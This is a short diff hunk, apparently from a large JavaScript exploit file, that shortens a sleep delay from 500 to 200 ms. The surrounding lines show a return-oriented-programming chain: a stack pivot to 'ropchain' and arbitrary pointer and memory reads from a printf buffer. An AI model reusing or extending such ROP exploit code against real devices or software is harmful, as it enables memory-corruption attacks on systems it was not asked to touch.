@@ -37655,7 +37655,7 @@ db([1000, 0, 0, 0, 0, 0]);
 db([0, 0, 100000, 0, 0, 0]);
 pivot(ropchain);
 
-await sleep(500);
+await sleep(200);
 var main_ret = read_ptr_at(main_ret);
 var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
 var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);
